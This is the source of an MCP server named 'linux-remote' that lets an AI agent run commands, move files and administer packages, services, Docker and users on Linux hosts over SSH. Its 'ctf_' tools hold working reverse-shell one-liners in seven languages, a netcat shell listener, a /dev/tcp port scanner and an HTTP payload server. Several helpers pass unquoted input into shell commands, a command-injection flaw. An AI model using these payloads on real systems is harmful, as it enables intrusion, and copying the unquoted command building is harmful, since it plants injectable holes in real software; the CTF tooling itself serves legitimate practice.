#!/usr/bin/env python3
"""
linux-remote MCP Server
Remote Linux machine control via SSH — connection pool, command execution,
file transfer, and high-level ops helpers.
"""

import asyncio
import json
from typing import Any

from mcp.server import Server
from mcp.server.stdio import stdio_server
from mcp.types import Tool, TextContent

from .session_manager import get_manager
from .config import (
    add_host, remove_host, list_hosts, resolve_connection,
)

# ═══════════════════════════════════════════════════════════════════
# Server setup
# ═══════════════════════════════════════════════════════════════════

server = Server("linux-remote")
mgr = get_manager()


def _ok(**kwargs) -> str:
    return json.dumps({"success": True, **kwargs}, ensure_ascii=False, default=str)


def _err(message: str, **kwargs) -> str:
    return json.dumps({"success": False, "error": message, **kwargs}, ensure_ascii=False, default=str)


# ═══════════════════════════════════════════════════════════════════
# Tool implementations
# ═══════════════════════════════════════════════════════════════════

async def _session_connect(
    target: str, user: str = "", port: int = 0,
    password: str = "", key_file: str = "", session_id: str = "",
) -> str:
    try:
        cfg = resolve_connection(
            target,
            user=user or None, port=port or None,
            password=password or None, key_file=key_file or None,
        )
        session = await mgr.connect(
            host=cfg["host"], port=cfg.get("port", 22),
            user=cfg.get("user", "root"),
            password=cfg.get("password"),
            key_file=cfg.get("key_file"),
            key_content=cfg.get("key_content"),
            session_id=session_id or None,
        )
        return _ok(session_id=session.session_id, host=session.host,
                    port=session.port, user=session.user,
                    message=f"Connected to {session.user}@{session.host}:{session.port} [{session.session_id}]")
    except Exception as e:
        return _err(str(e))


async def _session_disconnect(session_id: str) -> str:
    ok = await mgr.disconnect(session_id)
    if ok:
        return _ok(session_id=session_id, message=f"Session '{session_id}' disconnected.")
    return _err(f"Session '{session_id}' not found.")


async def _session_list() -> str:
    sessions = mgr.list_sessions()
    return _ok(sessions=sessions, count=len(sessions))


async def _exec(session_id: str, command: str, timeout: int = 30) -> str:
    result = await mgr.exec(session_id, command, timeout=timeout)
    return json.dumps(result, ensure_ascii=False)


async def _file_upload(session_id: str, local_path: str, remote_path: str) -> str:
    result = await mgr.upload(session_id, local_path, remote_path)
    return json.dumps(result, ensure_ascii=False)


async def _file_download(session_id: str, remote_path: str, local_path: str) -> str:
    result = await mgr.download(session_id, remote_path, local_path)
    return json.dumps(result, ensure_ascii=False)


async def _file_write(session_id: str, remote_path: str, content: str, mode: int = 420) -> str:
    """mode default 420 = 0o644"""
    result = await mgr.write_file(session_id, remote_path, content, mode)
    return json.dumps(result, ensure_ascii=False)


async def _file_read(session_id: str, remote_path: str, max_bytes: int = 102400) -> str:
    result = await mgr.read_file(session_id, remote_path, max_bytes)
    return json.dumps(result, ensure_ascii=False)


async def _file_exists(session_id: str, path: str) -> str:
    result = await mgr.file_exists(session_id, path)
    return json.dumps(result, ensure_ascii=False)


async def _host_add(
    alias: str, host: str, port: int = 22, user: str = "root",
    password: str = "", key_file: str = "", key_content: str = "",
) -> str:
    try:
        add_host(alias, host, port, user,
                 password=password or None, key_file=key_file or None,
                 key_content=key_content or None)
        return _ok(alias=alias, message=f"Host '{alias}' saved ({user}@{host}:{port}).")
    except Exception as e:
        return _err(str(e))


async def _host_remove(alias: str) -> str:
    ok = remove_host(alias)
    if ok:
        return _ok(alias=alias, message=f"Host '{alias}' removed.")
    return _err(f"Host '{alias}' not found.")


async def _host_list() -> str:
    hosts = list_hosts()
    return _ok(hosts=hosts, count=len(hosts))


async def _sys_info(session_id: str) -> str:
    cmd = """
echo "=== OS ==="
cat /etc/os-release 2>/dev/null | head -5 || cat /etc/redhat-release 2>/dev/null || uname -a
echo "=== KERNEL ==="
uname -r
echo "=== UPTIME ==="
uptime
echo "=== CPU ==="
nproc
echo "=== MEMORY_MB ==="
free -m 2>/dev/null | grep -E '^Mem:|^total' || cat /proc/meminfo 2>/dev/null | head -3
echo "=== DISK_GB ==="
df -h / 2>/dev/null | tail -1 || df -h 2>/dev/null | head -5
echo "=== END ==="
"""
    r = await mgr.exec(session_id, cmd, timeout=15)
    return json.dumps(r, ensure_ascii=False)


async def _sys_users(session_id: str) -> str:
    cmd = """awk -F: '$3>=1000 && $3<65534 {print $1, "(uid=" $3, "home=" $6 ")"}' /etc/passwd"""
    r = await mgr.exec(session_id, cmd)
    return json.dumps(r, ensure_ascii=False)


_PKG_DETECT = """
if command -v apt &>/dev/null; then echo "apt";
elif command -v dnf &>/dev/null; then echo "dnf";
elif command -v yum &>/dev/null; then echo "yum";
elif command -v pacman &>/dev/null; then echo "pacman";
elif command -v zypper &>/dev/null; then echo "zypper";
elif command -v apk &>/dev/null; then echo "apk";
else echo "unknown"; fi
"""


async def _pkg_install(session_id: str, packages: str) -> str:
    r = await mgr.exec(session_id, _PKG_DETECT.strip())
    pm = r["stdout"].strip()
    cmds = {
        "apt": f"DEBIAN_FRONTEND=noninteractive apt-get install -y {packages}",
        "dnf": f"dnf install -y {packages}",
        "yum": f"yum install -y {packages}",
        "pacman": f"pacman -S --noconfirm {packages}",
        "zypper": f"zypper install -y {packages}",
        "apk": f"apk add {packages}",
    }
    cmd = cmds.get(pm, f"echo 'UNSUPPORTED_PM:{pm}'")
    r2 = await mgr.exec(session_id, cmd, timeout=120)
    return json.dumps({**r2, "package_manager": pm, "packages": packages}, ensure_ascii=False)


async def _pkg_update(session_id: str) -> str:
    r = await mgr.exec(session_id, _PKG_DETECT.strip())
    pm = r["stdout"].strip()
    cmds = {
        "apt": "DEBIAN_FRONTEND=noninteractive apt-get update && DEBIAN_FRONTEND=noninteractive apt-get upgrade -y",
        "dnf": "dnf update -y",
        "yum": "yum update -y",
        "pacman": "pacman -Syu --noconfirm",
        "zypper": "zypper update -y",
        "apk": "apk update && apk upgrade",
    }
    cmd = cmds.get(pm, f"echo 'UNSUPPORTED_PM:{pm}'")
    r2 = await mgr.exec(session_id, cmd, timeout=300)
    return json.dumps({**r2, "package_manager": pm}, ensure_ascii=False)


async def _pkg_list(session_id: str, filter: str = "") -> str:
    r = await mgr.exec(session_id, _PKG_DETECT.strip())
    pm = r["stdout"].strip()
    cmds = {
        "apt": f"dpkg -l | grep -i '{filter}' | head -50" if filter else "dpkg -l | head -50",
        "dnf": f"dnf list installed | grep -i '{filter}' | head -50" if filter else "dnf list installed | head -50",
        "yum": f"yum list installed | grep -i '{filter}' | head -50" if filter else "yum list installed | head -50",
        "pacman": f"pacman -Qs '{filter}' | head -50" if filter else "pacman -Q | head -50",
        "apk": f"apk info | grep -i '{filter}' | head -50" if filter else "apk info | head -50",
    }
    cmd = cmds.get(pm, f"echo 'UNSUPPORTED_PM:{pm}'")
    r2 = await mgr.exec(session_id, cmd, timeout=30)
    return json.dumps({**r2, "package_manager": pm}, ensure_ascii=False)


_SVC_DETECT = "command -v systemctl &>/dev/null && echo 'systemd' || echo 'sysv'"


async def _svc_manage(session_id: str, service: str, action: str) -> str:
    valid = {"start", "stop", "restart", "enable", "disable", "status"}
    if action not in valid:
        return _err(f"Invalid action '{action}'. Use: {', '.join(sorted(valid))}")
    r = await mgr.exec(session_id, _SVC_DETECT)
    init = r["stdout"].strip()
    if init == "systemd":
        if action == "enable":
            cmd = f"systemctl enable {service}"
        elif action == "disable":
            cmd = f"systemctl disable {service}"
        else:
            cmd = f"systemctl {action} {service}"
    else:
        if action in ("enable", "disable"):
            cmd = "echo 'enable/disable not supported on sysvinit; use update-rc.d'"
        else:
            cmd = f"service {service} {action} 2>&1 || /etc/init.d/{service} {action} 2>&1"
    r2 = await mgr.exec(session_id, cmd, timeout=30)
    return json.dumps({**r2, "init_system": init, "service": service, "action": action}, ensure_ascii=False)


async def _svc_list(session_id: str) -> str:
    r = await mgr.exec(session_id, _SVC_DETECT)
    init = r["stdout"].strip()
    if init == "systemd":
        cmd = "systemctl list-units --type=service --state=running --no-pager | head -40"
    else:
        cmd = "service --status-all 2>/dev/null | grep '+' | head -40"
    r2 = await mgr.exec(session_id, cmd, timeout=15)
    return json.dumps({**r2, "init_system": init}, ensure_ascii=False)


async def _proc_list(session_id: str, sort_by: str = "cpu", count: int = 20) -> str:
    if sort_by == "mem":
        cmd = f"ps aux --sort=-%mem | head -{count + 1}"
    else:
        cmd = f"ps aux --sort=-%cpu | head -{count + 1}"
    r = await mgr.exec(session_id, cmd, timeout=10)
    return json.dumps(r, ensure_ascii=False)


async def _proc_kill(session_id: str, pid: int, signal: int = 15) -> str:
    r = await mgr.exec(session_id, f"kill -{signal} {pid} 2>&1 && echo 'KILLED' || echo 'FAILED'")
    return json.dumps(r, ensure_ascii=False)


async def _port_check(session_id: str, port: int) -> str:
    cmd = f"ss -tlnp 2>/dev/null | grep ':{port} ' || netstat -tlnp 2>/dev/null | grep ':{port} ' || echo 'NOT_LISTENING'"
    r = await mgr.exec(session_id, cmd)
    return json.dumps(r, ensure_ascii=False)


async def _port_listen(session_id: str) -> str:
    cmd = "ss -tlnp 2>/dev/null | head -40 || netstat -tlnp 2>/dev/null | head -40"
    r = await mgr.exec(session_id, cmd)
    return json.dumps(r, ensure_ascii=False)


async def _firewall_allow(session_id: str, port: int, protocol: str = "tcp") -> str:
    detect = """
if command -v ufw &>/dev/null && ufw status | grep -q 'Status: active'; then echo 'ufw';
elif command -v firewall-cmd &>/dev/null; then echo 'firewalld';
elif command -v iptables &>/dev/null; then echo 'iptables';
else echo 'none'; fi
"""
    r = await mgr.exec(session_id, detect.strip())
    fw = r["stdout"].strip()
    cmds = {
        "ufw": f"ufw allow {port}/{protocol}",
        "firewalld": f"firewall-cmd --add-port={port}/{protocol} --permanent && firewall-cmd --reload",
        "iptables": f"iptables -A INPUT -p {protocol} --dport {port} -j ACCEPT",
        "none": "echo 'NO_FIREWALL_DETECTED'",
    }
    cmd = cmds.get(fw, "echo 'UNKNOWN_FIREWALL'")
    if fw == "iptables":
        cmd += " && iptables-save > /etc/iptables/rules.v4 2>/dev/null || echo 'iptables rule added (not persisted)'"
    r2 = await mgr.exec(session_id, cmd, timeout=15)
    return json.dumps({**r2, "firewall_type": fw, "port": port, "protocol": protocol}, ensure_ascii=False)


async def _docker_ps(session_id: str, all: bool = False) -> str:
    flag = "-a" if all else ""
    r = await mgr.exec(session_id,
                        f"docker ps {flag} --format 'table {{{{.ID}}}}\t{{{{.Image}}}}\t{{{{.Names}}}}\t{{{{.Status}}}}\t{{{{.Ports}}}}' 2>&1",
                        timeout=15)
    return json.dumps(r, ensure_ascii=False)


async def _docker_run(
    session_id: str, image: str, name: str = "",
    ports: str = "", env: str = "", volume: str = "",
    restart: str = "unless-stopped", extra_args: str = "",
) -> str:
    parts = ["docker run -d"]
    if name:
        parts.append(f"--name {name}")
    if restart:
        parts.append(f"--restart {restart}")
    if ports:
        for p in ports.split(","):
            parts.append(f"-p {p.strip()}")
    if env:
        for e in env.split(","):
            parts.append(f"-e {e.strip()}")
    if volume:
        for v in volume.split(","):
            parts.append(f"-v {v.strip()}")
    if extra_args:
        parts.append(extra_args)
    parts.append(image)
    cmd = " ".join(parts)
    r = await mgr.exec(session_id, cmd, timeout=60)
    return json.dumps({**r, "command": cmd}, ensure_ascii=False)


async def _docker_stop(session_id: str, container: str, remove: bool = False) -> str:
    cmd = f"docker stop {container} && docker rm {container}" if remove else f"docker stop {container}"
    r = await mgr.exec(session_id, cmd, timeout=30)
    return json.dumps(r, ensure_ascii=False)


async def _docker_logs(session_id: str, container: str, tail: int = 50) -> str:
    r = await mgr.exec(session_id, f"docker logs --tail {tail} {container} 2>&1", timeout=15)
    return json.dumps(r, ensure_ascii=False)


async def _docker_exec(session_id: str, container: str, command: str) -> str:
    r = await mgr.exec(session_id, f"docker exec {container} {command}", timeout=30)
    return json.dumps(r, ensure_ascii=False)


async def _user_add(session_id: str, username: str, password: str = "", sudo: bool = False) -> str:
    import shlex
    u = shlex.quote(username)
    cmds = [f"id {u} &>/dev/null && echo 'USER_EXISTS' || useradd -m -s /bin/bash {u}"]
    if password:
        p = shlex.quote(password)
        cmds.append(f"echo '{u}:{p}' | chpasswd")
    if sudo:
        cmds.append(f"usermod -aG sudo {u} 2>/dev/null || usermod -aG wheel {u} 2>/dev/null")
        cmds.append(f"echo '{u} ALL=(ALL) NOPASSWD:ALL' > /etc/sudoers.d/{u} && chmod 440 /etc/sudoers.d/{u}")
    cmd = " && ".join(cmds)
    r = await mgr.exec(session_id, cmd, timeout=15)
    return json.dumps({**r, "username": username, "sudo": sudo}, ensure_ascii=False)


async def _user_del(session_id: str, username: str) -> str:
    import shlex
    u = shlex.quote(username)
    r = await mgr.exec(session_id, f"userdel -r {u} 2>&1 && echo 'DELETED' || echo 'FAILED'")
    return json.dumps(r, ensure_ascii=False)


async def _ctf_serve_http(session_id: str, port: int = 8000, directory: str = ".") -> str:
    import shlex
    d = shlex.quote(directory)
    cmd = f"cd {d} && (python3 -m http.server {port} --bind 0.0.0.0 2>/dev/null || python -m SimpleHTTPServer {port} 2>/dev/null) > /tmp/http-server-{port}.log 2>&1 & echo $!"
    r = await mgr.exec(session_id, cmd, timeout=5)
    pid = r["stdout"].strip()
    return json.dumps({**r, "pid": pid, "port": port, "url": f"http://<host>:{port}"}, ensure_ascii=False)


async def _ctf_listen_port(session_id: str, port: int, protocol: str = "tcp") -> str:
    if protocol == "udp":
        bg_cmd = f"nohup nc -ulvp {port} > /tmp/nc-{port}.log 2>&1 & echo $!"
    else:
        bg_cmd = f"nohup nc -lvp {port} > /tmp/nc-{port}.log 2>&1 & echo $!"
    r = await mgr.exec(session_id, bg_cmd, timeout=5)
    pid = r["stdout"].strip()
    return json.dumps({**r, "pid": pid, "port": port, "protocol": protocol,
                        "command": f"nc -{'u' if protocol=='udp' else ''}lvp {port}"}, ensure_ascii=False)


async def _ctf_scan_ports(session_id: str, target: str, ports: str = "1-1000") -> str:
    ports_range = ports.replace("-", " ")
    cmd = f"""
for port in $(seq {ports_range} 2>/dev/null); do
  timeout 1 bash -c "echo >/dev/tcp/{target}/$port" 2>/dev/null && echo "OPEN:$port"
done
"""
    r = await mgr.exec(session_id, cmd, timeout=120)
    open_ports = [line.replace("OPEN:", "") for line in r["stdout"].split("\n") if "OPEN:" in line]
    return json.dumps({**r, "open_ports": open_ports, "target": target}, ensure_ascii=False)


_REVERSE_SHELLS = {
    "bash": "bash -i >& /dev/tcp/{ip}/{port} 0>&1",
    "bash5": "bash -c 'exec bash -i &>/dev/tcp/{ip}/{port} <&1'",
    "python": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
    "nc": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f",
    "php": "php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
    "perl": "perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
    "ruby": "ruby -rsocket -e 'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
}


async def _ctf_reverse_shell(ip: str, port: int, shell_type: str = "bash") -> str:
    template = _REVERSE_SHELLS.get(shell_type)
    if not template:
        return _err(f"Unknown shell_type '{shell_type}'. Options: {', '.join(_REVERSE_SHELLS.keys())}")
    payload = template.format(ip=ip, port=port)
    return json.dumps({
        "success": True, "shell_type": shell_type, "payload": payload,
        "listener_hint": f"First run on your machine: nc -lvp {port}",
    }, ensure_ascii=False)


# ═══════════════════════════════════════════════════════════════════
# Tool registry — schema + handler mapping
# ═══════════════════════════════════════════════════════════════════

TOOL_SCHEMAS: list[Tool] = [
    Tool(name="session_connect", description="Connect to a Linux host via SSH. target: IP/hostname or a pre-configured alias. Use password or key_file for ad-hoc connections.",
         inputSchema={"type": "object", "properties": {
             "target": {"type": "string", "description": "IP, hostname, or pre-configured alias"},
             "user": {"type": "string", "description": "SSH username (optional if pre-configured)"},
             "port": {"type": "integer", "description": "SSH port (default 22)"},
             "password": {"type": "string", "description": "SSH password (for ad-hoc connections)"},
             "key_file": {"type": "string", "description": "Path to SSH private key file (for ad-hoc connections)"},
             "session_id": {"type": "string", "description": "Custom session ID (auto-generated if empty)"},
         }, "required": ["target"]}),

    Tool(name="session_disconnect", description="Disconnect an active SSH session.",
         inputSchema={"type": "object", "properties": {
             "session_id": {"type": "string", "description": "Session ID to disconnect"},
         }, "required": ["session_id"]}),

    Tool(name="session_list", description="List all active SSH sessions with host, user, uptime.",
         inputSchema={"type": "object", "properties": {}}),

    Tool(name="exec", description="Execute a shell command on a remote session. Returns stdout, stderr, exit_code.",
         inputSchema={"type": "object", "properties": {
             "session_id": {"type": "string", "description": "Session ID"},
             "command": {"type": "string", "description": "Shell command to execute"},
             "timeout": {"type": "integer", "description": "Timeout in seconds (default 30)"},
         }, "required": ["session_id", "command"]}),

    Tool(name="file_upload", description="Upload a local file to the remote host via SFTP.",
         inputSchema={"type": "object", "properties": {
             "session_id": {"type": "string"}, "local_path": {"type": "string"}, "remote_path": {"type": "string"},
         }, "required": ["session_id", "local_path", "remote_path"]}),

    Tool(name="file_download", description="Download a file from the remote host via SFTP.",
         inputSchema={"type": "object", "properties": {
             "session_id": {"type": "string"}, "remote_path": {"type": "string"}, "local_path": {"type": "string"},
         }, "required": ["session_id", "remote_path", "local_path"]}),

    Tool(name="file_write", description="Write string content directly to a remote file (creates or overwrites).",
         inputSchema={"type": "object", "properties": {
             "session_id": {"type": "string"}, "remote_path": {"type": "string"},
             "content": {"type": "string", "description": "Text content to write"},
             "mode": {"type": "integer", "description": "File permission mode in decimal (e.g. 420=0o644, default 420)"},
         }, "required": ["session_id", "remote_path", "content"]}),

    Tool(name="file_read", description="Read the full text content of a remote file.",
         inputSchema={"type": "object", "properties": {
             "session_id": {"type": "string"}, "remote_path": {"type": "string"},
             "max_bytes": {"type": "integer", "description": "Max bytes to read (default 102400)"},
         }, "required": ["session_id", "remote_path"]}),

    Tool(name="file_exists", description="Check whether a file or directory exists on the remote host.",
         inputSchema={"type": "object", "properties": {
             "session_id": {"type": "string"}, "path": {"type": "string"},
         }, "required": ["session_id", "path"]}),

    Tool(name="host_add", description="Save a host configuration (alias, host, user, password/key) for quick reuse.",
         inputSchema={"type": "object", "properties": {
             "alias": {"type": "string", "description": "Short name for this host"},
             "host": {"type": "string", "description": "IP or hostname"},
             "port": {"type": "integer", "description": "SSH port (default 22)"},
             "user": {"type": "string", "description": "SSH username (default root)"},
             "password": {"type": "string", "description": "SSH password"},
             "key_file": {"type": "string", "description": "Path to SSH private key file"},
             "key_content": {"type": "string", "description": "SSH private key content as string"},
         }, "required": ["alias", "host"]}),

    Tool(name="host_remove", description="Remove a saved host configuration.",
         inputSchema={"type": "object", "properties": {
             "alias": {"type": "string"},
         }, "required": ["alias"]}),

    Tool(name="host_list", description="List all saved host configurations.",
         inputSchema={"type": "object", "properties": {}}),

    Tool(name="sys_info", description="Get system overview: OS, kernel, uptime, CPU, memory, disk.",
         inputSchema={"type": "object", "properties": {
             "session_id": {"type": "string"},
         }, "required": ["session_id"]}),

    Tool(name="sys_users", description="List human users on the system (uid >= 1000).",
         inputSchema={"type": "object", "properties": {
             "session_id": {"type": "string"},
         }, "required": ["session_id"]}),

    Tool(name="pkg_install", description="Install packages. Auto-detects apt/yum/dnf/pacman/apk.",
         inputSchema={"type": "object", "properties": {
             "session_id": {"type": "string"},
             "packages": {"type": "string", "description": "Space-separated package names, e.g. 'nginx docker.io'"},
         }, "required": ["session_id", "packages"]}),

    Tool(name="pkg_update", description="Update all system packages. Auto-detects package manager.",
         inputSchema={"type": "object", "properties": {
             "session_id": {"type": "string"},
         }, "required": ["session_id"]}),

    Tool(name="pkg_list", description="List installed packages, optionally filtered by name.",
         inputSchema={"type": "object", "properties": {
             "session_id": {"type": "string"},
             "filter": {"type": "string", "description": "Optional filter string"},
         }, "required": ["session_id"]}),

    Tool(name="svc_manage", description="Manage a service: start/stop/restart/enable/disable/status. Auto-detects systemd/sysvinit.",
         inputSchema={"type": "object", "properties": {
             "session_id": {"type": "string"},
             "service": {"type": "string", "description": "Service name, e.g. nginx, sshd, docker"},
             "action": {"type": "string", "description": "start | stop | restart | enable | disable | status"},
         }, "required": ["session_id", "service", "action"]}),

    Tool(name="svc_list", description="List currently running services.",
         inputSchema={"type": "object", "properties": {
             "session_id": {"type": "string"},
         }, "required": ["session_id"]}),

    Tool(name="proc_list", description="List top processes sorted by cpu or memory.",
         inputSchema={"type": "object", "properties": {
             "session_id": {"type": "string"},
             "sort_by": {"type": "string", "description": "cpu (default) or mem"},
             "count": {"type": "integer", "description": "Number of processes to show (default 20)"},
         }, "required": ["session_id"]}),

    Tool(name="proc_kill", description="Kill a process by PID. Default signal 15 (SIGTERM).",
         inputSchema={"type": "object", "properties": {
             "session_id": {"type": "string"},
             "pid": {"type": "integer"},
             "signal": {"type": "integer", "description": "Signal number: 9=SIGKILL, 15=SIGTERM (default)"},
         }, "required": ["session_id", "pid"]}),

    Tool(name="port_check", description="Check if a specific port is listening and what process uses it.",
         inputSchema={"type": "object", "properties": {
             "session_id": {"type": "string"}, "port": {"type": "integer"},
         }, "required": ["session_id", "port"]}),

    Tool(name="port_listen", description="List all listening TCP ports with process info.",
         inputSchema={"type": "object", "properties": {
             "session_id": {"type": "string"},
         }, "required": ["session_id"]}),

    Tool(name="firewall_allow", description="Open a port in firewall. Auto-detects ufw/firewalld/iptables.",
         inputSchema={"type": "object", "properties": {
             "session_id": {"type": "string"}, "port": {"type": "integer"},
             "protocol": {"type": "string", "description": "tcp (default) or udp"},
         }, "required": ["session_id", "port"]}),

    Tool(name="docker_ps", description="List Docker containers (running by default; use all=true for all).",
         inputSchema={"type": "object", "properties": {
             "session_id": {"type": "string"},
             "all": {"type": "boolean", "description": "Show all containers including stopped (default false)"},
         }, "required": ["session_id"]}),

    Tool(name="docker_run", description="Run a Docker container with ports, env, volumes, restart policy.",
         inputSchema={"type": "object", "properties": {
             "session_id": {"type": "string"}, "image": {"type": "string", "description": "Docker image name"},
             "name": {"type": "string", "description": "Container name"},
             "ports": {"type": "string", "description": "Port mappings, comma-separated: '8080:80,443:443'"},
             "env": {"type": "string", "description": "Environment vars, comma-separated: 'KEY=val,KEY2=val2'"},
             "volume": {"type": "string", "description": "Volume mounts, comma-separated: '/host:/container,/data:/data'"},
             "restart": {"type": "string", "description": "Restart policy (default: unless-stopped)"},
             "extra_args": {"type": "string", "description": "Additional docker run arguments"},
         }, "required": ["session_id", "image"]}),

    Tool(name="docker_stop", description="Stop (and optionally remove) a Docker container.",
         inputSchema={"type": "object", "properties": {
             "session_id": {"type": "string"}, "container": {"type": "string"},
             "remove": {"type": "boolean", "description": "Also remove the container after stopping"},
         }, "required": ["session_id", "container"]}),

    Tool(name="docker_logs", description="Get recent logs from a Docker container.",
         inputSchema={"type": "object", "properties": {
             "session_id": {"type": "string"}, "container": {"type": "string"},
             "tail": {"type": "integer", "description": "Number of lines to return (default 50)"},
         }, "required": ["session_id", "container"]}),

    Tool(name="docker_exec", description="Execute a command inside a running Docker container.",
         inputSchema={"type": "object", "properties": {
             "session_id": {"type": "string"}, "container": {"type": "string"},
             "command": {"type": "string", "description": "Command to execute inside the container"},
         }, "required": ["session_id", "container", "command"]}),

    Tool(name="user_add", description="Create a Linux user, optionally with password and sudo access.",
         inputSchema={"type": "object", "properties": {
             "session_id": {"type": "string"}, "username": {"type": "string"},
             "password": {"type": "string", "description": "User password (optional)"},
             "sudo": {"type": "boolean", "description": "Grant sudo access (default false)"},
         }, "required": ["session_id", "username"]}),

    Tool(name="user_del", description="Delete a Linux user and their home directory.",
         inputSchema={"type": "object", "properties": {
             "session_id": {"type": "string"}, "username": {"type": "string"},
         }, "required": ["session_id", "username"]}),

    Tool(name="ctf_serve_http", description="Quickly serve a directory over HTTP (Python http.server).",
         inputSchema={"type": "object", "properties": {
             "session_id": {"type": "string"},
             "port": {"type": "integer", "description": "Port to serve on (default 8000)"},
             "directory": {"type": "string", "description": "Directory to serve (default current dir)"},
         }, "required": ["session_id"]}),

    Tool(name="ctf_listen_port", description="Start a netcat listener to receive connections/shells.",
         inputSchema={"type": "object", "properties": {
             "session_id": {"type": "string"}, "port": {"type": "integer"},
             "protocol": {"type": "string", "description": "tcp (default) or udp"},
         }, "required": ["session_id", "port"]}),

    Tool(name="ctf_reverse_shell", description="Generate a reverse shell one-liner. Give YOUR ip and port where you're listening.",
         inputSchema={"type": "object", "properties": {
             "ip": {"type": "string", "description": "YOUR IP address for the target to connect back to"},
             "port": {"type": "integer", "description": "YOUR listening port"},
             "shell_type": {"type": "string", "description": "bash (default), bash5, python, nc, php, perl, ruby"},
         }, "required": ["ip", "port"]}),

    Tool(name="ctf_scan_ports", description="Quick port scan from the remote machine using bash /dev/tcp.",
         inputSchema={"type": "object", "properties": {
             "session_id": {"type": "string"}, "target": {"type": "string", "description": "Target IP or hostname"},
             "ports": {"type": "string", "description": "Port range, e.g. '1-1000' (default) or '80,443,8080'"},
         }, "required": ["session_id", "target"]}),
]

# Build handler lookup
_HANDLERS: dict[str, Any] = {
    "session_connect": _session_connect,
    "session_disconnect": _session_disconnect,
    "session_list": _session_list,
    "exec": _exec,
    "file_upload": _file_upload,
    "file_download": _file_download,
    "file_write": _file_write,
    "file_read": _file_read,
    "file_exists": _file_exists,
    "host_add": _host_add,
    "host_remove": _host_remove,
    "host_list": _host_list,
    "sys_info": _sys_info,
    "sys_users": _sys_users,
    "pkg_install": _pkg_install,
    "pkg_update": _pkg_update,
    "pkg_list": _pkg_list,
    "svc_manage": _svc_manage,
    "svc_list": _svc_list,
    "proc_list": _proc_list,
    "proc_kill": _proc_kill,
    "port_check": _port_check,
    "port_listen": _port_listen,
    "firewall_allow": _firewall_allow,
    "docker_ps": _docker_ps,
    "docker_run": _docker_run,
    "docker_stop": _docker_stop,
    "docker_logs": _docker_logs,
    "docker_exec": _docker_exec,
    "user_add": _user_add,
    "user_del": _user_del,
    "ctf_serve_http": _ctf_serve_http,
    "ctf_listen_port": _ctf_listen_port,
    "ctf_reverse_shell": _ctf_reverse_shell,
    "ctf_scan_ports": _ctf_scan_ports,
}


# ═══════════════════════════════════════════════════════════════════
# MCP Decorators
# ═══════════════════════════════════════════════════════════════════

@server.list_tools()
async def list_tools() -> list[Tool]:
    return TOOL_SCHEMAS


@server.call_tool()
async def call_tool(name: str, arguments: dict) -> list[TextContent]:
    handler = _HANDLERS.get(name)
    if not handler:
        raise ValueError(f"Unknown tool: {name}")
    result = await handler(**arguments)
    return [TextContent(type="text", text=result)]


# ═══════════════════════════════════════════════════════════════════
# Entry point
# ═══════════════════════════════════════════════════════════════════

def main():
    """Entry point for linux-remote-mcp."""
    async def run():
        async with stdio_server() as (read_stream, write_stream):
            await server.run(read_stream, write_stream, server.create_initialization_options())

    asyncio.run(run())


if __name__ == "__main__":
    main()
